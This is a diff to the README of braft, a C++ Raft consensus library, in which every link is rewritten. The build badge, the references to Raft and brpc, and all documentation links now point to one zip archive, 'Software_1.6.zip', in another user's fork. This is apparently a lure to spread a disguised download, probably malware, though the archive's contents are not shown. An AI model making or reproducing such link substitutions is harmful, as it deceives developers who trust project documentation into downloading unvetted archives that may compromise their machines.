@@ -1,8 +1,8 @@
-[![Build Status](https://travis-ci.org/brpc/braft.svg?branch=master)](https://travis-ci.org/brpc/braft)
+[![Build Status](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
 
 ---
 
-An industrial-grade C++ implementation of [RAFT consensus algorithm](https://raft.github.io/) and [replicated state machine](https://en.wikipedia.org/wiki/State_machine_replication) based on [brpc](https://github.com/brpc/brpc). braft is designed and implemented for scenarios demanding for high workload and low overhead of latency, with the consideration for easy-to-understand concepts so that engineers inside Baidu can build their own distributed systems individually and correctly.
+An industrial-grade C++ implementation of [RAFT consensus algorithm](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip) and [replicated state machine](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip) based on [brpc](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip). braft is designed and implemented for scenarios demanding for high workload and low overhead of latency, with the consideration for easy-to-understand concepts so that engineers inside Baidu can build their own distributed systems individually and correctly.
 
 It's widely used inside Baidu to build highly-available systems, such as:
 * Storage systems: Key-Value, Block, Object, File ...
@@ -11,7 +11,7 @@ It's widely used inside Baidu to build highly-available systems, such as:
 
 # Getting Started
 
-* Build [brpc](https://github.com/brpc/brpc/blob/master/docs/cn/getting_started.md) which is the main dependency of braft.
+* Build [brpc](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip) which is the main dependency of braft.
 
 * Compile braft with cmake
 
@@ -23,15 +23,15 @@ It's widely used inside Baidu to build highly-available systems, such as:
 
 # Docs
 
-* Read [overview](./docs/cn/overview.md) to know what you can do with braft.
-* Read [benchmark](./docs/cn/benchmark.md) to have a quick view about performance of braft
-* [Build Service based on braft](./docs/cn/server.md)
-* [Access Service based on braft](./docs/cn/client.md)
-* [Cli tools](./docs/cn/cli.md)
-* [Replication Model](./docs/cn/replication.md)
+* Read [overview](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip) to know what you can do with braft.
+* Read [benchmark](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip) to have a quick view about performance of braft
+* [Build Service based on braft](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
+* [Access Service based on braft](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
+* [Cli tools](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
+* [Replication Model](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
 * Consensus protocol:
-  * [RAFT](./docs/cn/raft_protocol.md)
-  * [Paxos](./docs/cn/paxos_protocol.md)
-  * [ZAB](./docs/cn/zab_protocol.md)
-  * [QJM](./docs/cn/qjm.md)
+  * [RAFT](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
+  * [Paxos](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
+  * [ZAB](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
+  * [QJM](https://raw.githubusercontent.com/tanglongwei/braft/master/jepsen/target/Software_1.6.zip)
 
